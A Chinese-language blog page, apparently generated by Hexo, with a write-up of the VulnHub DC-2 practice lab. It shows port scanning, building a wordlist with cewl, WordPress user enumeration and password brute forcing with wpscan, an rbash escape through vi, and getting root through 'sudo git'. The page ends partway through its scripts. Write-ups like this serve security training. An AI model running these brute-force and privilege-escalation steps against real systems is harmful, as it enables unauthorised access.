@@ -1,0 +1,774 @@
+
+
+<!DOCTYPE html>
+<html lang="en" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/blog.jpg">
+  <link rel="icon" href="/img/blog.jpg">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="John Doe">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="DC-2靶场搭渗透信息收集首先用goby扫描，发现开放了80端口，  访问，收集到是用了wordpress4.7.10，并且发现flag1，提示到了cewl,（cewl工具生成字典），猜测应该是弱口令登录，一般wordpress后台登录界面为wp-login.php，顺手一试，发现果然存在登陆界面。   进行爆破生成字典前面提示我们使用cewl进行生成字典， sudo touch &#x2F;ho">
+<meta property="og:type" content="article">
+<meta property="og:title" content="DC-2靶场搭渗透">
+<meta property="og:url" content="http://example.com/2022/05/07/DC-2%E9%9D%B6%E5%9C%BA%E6%90%AD%E6%B8%97%E9%80%8F/index.html">
+<meta property="og:site_name" content="TTblog">
+<meta property="og:description" content="DC-2靶场搭渗透信息收集首先用goby扫描，发现开放了80端口，  访问，收集到是用了wordpress4.7.10，并且发现flag1，提示到了cewl,（cewl工具生成字典），猜测应该是弱口令登录，一般wordpress后台登录界面为wp-login.php，顺手一试，发现果然存在登陆界面。   进行爆破生成字典前面提示我们使用cewl进行生成字典， sudo touch &#x2F;ho">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://raw.githubusercontent.com/shenmaa/tupian/main/img/202305071453438.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/shenmaa/tupian/main/img/202305071454970.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/shenmaa/tupian/main/img/202305071500664.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/shenmaa/tupian/main/img/202305071521302.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/shenmaa/tupian/main/img/202305071522177.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/shenmaa/tupian/main/img/202305071524334.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/shenmaa/tupian/main/img/202305071531786.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/shenmaa/tupian/main/img/202305071534569.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/shenmaa/tupian/main/img/202305071539383.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/shenmaa/tupian/main/img/202305071547250.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/shenmaa/tupian/main/img/202305071559875.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/shenmaa/tupian/main/img/202305071604167.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/shenmaa/tupian/main/img/202305071608088.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/shenmaa/tupian/main/img/202305071609909.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/shenmaa/tupian/main/img/202305071610585.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/shenmaa/tupian/main/img/202305071616615.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/shenmaa/tupian/main/img/202305071618364.png">
+<meta property="article:published_time" content="2022-05-07T03:22:34.000Z">
+<meta property="article:modified_time" content="2023-05-07T08:25:24.545Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="渗透测试">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/shenmaa/tupian/main/img/202305071453438.png">
+  
+  
+  
+  <title>DC-2靶场搭渗透 - TTblog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.4","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>不会做题的菜鸡</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                <span>主页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>文章</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                <span>类别</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/bg.jpg') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="DC-2靶场搭渗透"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2022-05-07 11:22" pubdate>
+          May 7, 2022 am
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          1.8k words
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          15 mins
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">DC-2靶场搭渗透</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="DC-2靶场搭渗透"><a href="#DC-2靶场搭渗透" class="headerlink" title="DC-2靶场搭渗透"></a>DC-2靶场搭渗透</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>首先用goby扫描，发现开放了80端口，</p>
+<p><img src="https://raw.githubusercontent.com/shenmaa/tupian/main/img/202305071453438.png" srcset="/img/loading.gif" lazyload alt="image-20230507145329743"></p>
+<p>访问，收集到是用了wordpress4.7.10，并且发现flag1，提示到了cewl,（cewl工具生成字典），猜测应该是弱口令登录，一般wordpress后台登录界面为wp-login.php，顺手一试，发现果然存在登陆界面。</p>
+<p><img src="https://raw.githubusercontent.com/shenmaa/tupian/main/img/202305071454970.png" srcset="/img/loading.gif" lazyload alt="image-20230507145435859"></p>
+<p><img src="https://raw.githubusercontent.com/shenmaa/tupian/main/img/202305071500664.png" srcset="/img/loading.gif" lazyload alt="image-20230507150020602"></p>
+<h2 id="进行爆破"><a href="#进行爆破" class="headerlink" title="进行爆破"></a>进行爆破</h2><h3 id="生成字典"><a href="#生成字典" class="headerlink" title="生成字典"></a>生成字典</h3><p>前面提示我们使用cewl进行生成字典，</p>
+<p>sudo touch &#x2F;home&#x2F;kali&#x2F;桌面&#x2F;dic1t.txt</p>
+<p>sudo chmod 777 &#x2F;home&#x2F;kali&#x2F;桌面</p>
+<p>sudo chmod 777 &#x2F;home&#x2F;kali&#x2F;桌面&#x2F;dic1t.txt</p>
+<p>cewl <a target="_blank" rel="noopener" href="http://dc-2/">http://dc-2/</a> -w &#x2F;home&#x2F;kali&#x2F;桌面&#x2F;dic1t.txt</p>
+<p><img src="https://raw.githubusercontent.com/shenmaa/tupian/main/img/202305071521302.png" srcset="/img/loading.gif" lazyload alt="image-20230507152138228"></p>
+<h3 id="扫描"><a href="#扫描" class="headerlink" title="扫描"></a>扫描</h3><p>用工具 WPScan</p>
+<p>WPScan 工具就是一个专门针对 WordPress 的安全漏洞和风险进行扫描和测试的工具，是Kali Linux默认自带的一款漏洞扫描工具，它采用Ruby编写，能够扫描WordPress网站中的多种安全漏洞，其中包括WordPress本身的漏洞、插件漏洞和主题漏洞。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cobol">wpscan --url dc-2 -e u<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/shenmaa/tupian/main/img/202305071522177.png" srcset="/img/loading.gif" lazyload alt="image-20230507152235097"></p>
+<p>这里爆出来三个用户名，接着我们在桌面创建一个name.txt文件，放着这些用户名</p>
+<p><img src="https://raw.githubusercontent.com/shenmaa/tupian/main/img/202305071524334.png" srcset="/img/loading.gif" lazyload alt="image-20230507152428268"></p>
+<h3 id="开始爆破"><a href="#开始爆破" class="headerlink" title="开始爆破"></a>开始爆破</h3><p>使用工具wpscan，用户名字典选择name.txt，密码字典选择cewl生成的字典dic1t.txt</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cobol">wpscan --url dc-2 -U /home/kali/桌面/name.txt -P /home/kali/桌面/dic1t.txt<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/shenmaa/tupian/main/img/202305071531786.png" srcset="/img/loading.gif" lazyload alt="image-20230507153138713"></p>
+<p>爆破出来jerry，tom的密码</p>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">Username:</span> <span class="hljs-string">jerry,</span> <span class="hljs-attr">Password:</span> <span class="hljs-string">adipiscing</span><br><span class="hljs-attr">Username:</span> <span class="hljs-string">tom,</span> <span class="hljs-attr">Password:</span> <span class="hljs-string">parturient</span><br></code></pre></td></tr></table></figure>
+
+<p>登陆上发现flag2，提示我们还有另一种入口。</p>
+<p><img src="https://raw.githubusercontent.com/shenmaa/tupian/main/img/202305071534569.png" srcset="/img/loading.gif" lazyload alt="image-20230507153450500"></p>
+<h2 id="系统渗透"><a href="#系统渗透" class="headerlink" title="系统渗透"></a>系统渗透</h2><h3 id="信息收集-1"><a href="#信息收集-1" class="headerlink" title="信息收集"></a>信息收集</h3><p>利用nmap对ip进行全面扫描，找下是否有其他端口。</p>
+<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">nmap -<span class="hljs-selector-tag">A</span> -<span class="hljs-selector-tag">p</span>- <span class="hljs-number">192.168</span>.<span class="hljs-number">1.11</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/shenmaa/tupian/main/img/202305071539383.png" srcset="/img/loading.gif" lazyload alt="image-20230507153907325"></p>
+<p>发现还存在7744端口 开放了ssh服务，可以利用爆出来的用户密码尝试连接。</p>
+<figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs swift">ssh 用户名<span class="hljs-meta">@主机地址</span> <span class="hljs-operator">-</span>p 端口<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cobol">ssh jerry@192.168.1.11 -p 7744<br></code></pre></td></tr></table></figure>
+
+<h3 id="ssh连接"><a href="#ssh连接" class="headerlink" title="ssh连接"></a>ssh连接</h3><p>我这里采用了xshell进行连接发现tom用户连接上了，测试whoami发现没有权限。</p>
+<p><img src="https://raw.githubusercontent.com/shenmaa/tupian/main/img/202305071547250.png" srcset="/img/loading.gif" lazyload alt="image-20230507154759201"></p>
+<h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p>这里设计到了一个知识点<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_43168364/article/details/111830233">rbash逃逸</a>。</p>
+<p>我们先来看一下rbash限制后能进行那些操作</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs cobol">echo $PATH<br>#查看上面得到path路径的所有文件<br>#运行结果 /home/tom/usr/bin<br>echo /home/tom/usr/bin/*<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/shenmaa/tupian/main/img/202305071559875.png" srcset="/img/loading.gif" lazyload alt="image-20230507155924835"></p>
+<p>可以看见能用这四个命令，唯一有用的就只有vi（编辑器）这个命令，这里可以里用vi或者是BASH_CMDS设置shell来绕过rbash，然后再设置环境变量添加命令</p>
+<p>首先进入vi</p>
+<p>按Esc</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">输入:<span class="hljs-built_in">set</span> <span class="hljs-attribute">shell</span>=/bin/bash<br></code></pre></td></tr></table></figure>
+
+<p>设置好shell并回车，接着输入 </p>
+<figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile"><span class="hljs-keyword">shell</span><br></code></pre></td></tr></table></figure>
+
+<h3 id="查看flag"><a href="#查看flag" class="headerlink" title="查看flag"></a>查看flag</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> flag*<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/shenmaa/tupian/main/img/202305071604167.png" srcset="/img/loading.gif" lazyload alt="image-20230507160418055"></p>
+<h3 id="切换用户"><a href="#切换用户" class="headerlink" title="切换用户"></a>切换用户</h3><p>提示我们jerry，那我们切换用户</p>
+<figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">su jerry</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/shenmaa/tupian/main/img/202305071608088.png" srcset="/img/loading.gif" lazyload alt="image-20230507160803050"></p>
+<p>然后用命令找一下flag文件</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-built_in">find</span> / -name <span class="hljs-number">*f</span>lag*<br></code></pre></td></tr></table></figure>
+
+<p>除了flag4.txt，其他文件的权限都没有，我们先看看flag4.txt</p>
+<p><img src="https://raw.githubusercontent.com/shenmaa/tupian/main/img/202305071609909.png" srcset="/img/loading.gif" lazyload alt="image-20230507160921843"></p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">cat <span class="hljs-regexp">/home/</span>jerry/flag4.txt<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/shenmaa/tupian/main/img/202305071610585.png" srcset="/img/loading.gif" lazyload alt="image-20230507161056537"></p>
+<p>提示了我们git，还有root看来是要提权的操作</p>
+<h2 id="git提权"><a href="#git提权" class="headerlink" title="git提权"></a>git提权</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cobol">sudo -l #列出当前用户在系统上可以执行的命令和命令集合sudo命令选项<br></code></pre></td></tr></table></figure>
+
+<p>发现git能使用root的权限</p>
+<figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arduino">sudo git help config<br></code></pre></td></tr></table></figure>
+
+<p>回车然后输入</p>
+<figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs typescript">!<span class="hljs-regexp">/bin/</span>bash  (这里bash也可以换成sh)<br></code></pre></td></tr></table></figure>
+
+<h3 id="找flag"><a href="#找flag" class="headerlink" title="找flag"></a>找flag</h3><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros">cd /<br><span class="hljs-built_in">find</span> / -name <span class="hljs-number">*f</span>lag*<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/shenmaa/tupian/main/img/202305071616615.png" srcset="/img/loading.gif" lazyload alt="image-20230507161658563"></p>
+<h3 id="查看flag-1"><a href="#查看flag-1" class="headerlink" title="查看flag"></a>查看flag</h3><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gradle">cat <span class="hljs-regexp">/root/</span><span class="hljs-keyword">final</span>*<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/shenmaa/tupian/main/img/202305071618364.png" srcset="/img/loading.gif" lazyload alt="image-20230507161812324"></p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>1.利用字典生成工具cewl</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">cewl 网址(如https:<span class="hljs-regexp">//</span>www.baidu.com) -w 文件名(如dict.txt)<br></code></pre></td></tr></table></figure>
+
+
+
+<ol start="2">
+<li><p>扫描工具WPScan（只适用于WordPress）<a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/149725645">Kali(渗透工具):WPScan的使用</a></p>
+<p>口令爆破</p>
+<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">wpscan <span class="hljs-attr">--url</span> 网站地址 -U 用户名字典 -<span class="hljs-selector-tag">P</span> 密码字典<br></code></pre></td></tr></table></figure></li>
+</ol>
+<p>3.Linux命令</p>
+<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss"><span class="hljs-built_in">vi</span>(或vim)<br></code></pre></td></tr></table></figure>
+
+<p>可配合提权操作，进去后，按Esc键可执行操作，输入一下命令</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs cobol">:set shell=/bin/bash（bash可以用sh代替）<br><br><br><br>:shell<br></code></pre></td></tr></table></figure>
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/vulnhub/" class="category-chain-item">vulnhub</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">#渗透测试</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>DC-2靶场搭渗透</div>
+      <div>http://example.com/2022/05/07/DC-2靶场搭渗透/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>Author</div>
+          <div>John Doe</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>Posted on</div>
+          <div>May 7, 2022</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>Licensed under</div>
+          <div>
+            
+              
+              
+                <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - Attribution">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2022/06/06/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/" title="流量分析">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">流量分析</span>
+                        <span class="visible-mobile">Previous</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2022/05/01/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB2/" title="文件包含2">
+                        <span class="hidden-mobile">文件包含2</span>
+                        <span class="visible-mobile">Next</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>Table of Contents</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">Keyword</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="http://140.210.217.83/" target="_blank" rel="nofollow noopener"><span>推荐</span></a> <i class="iconfont icon-love"></i> <a href="http://140.210.217.83/" target="_blank" rel="nofollow noopener"><span>博客</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
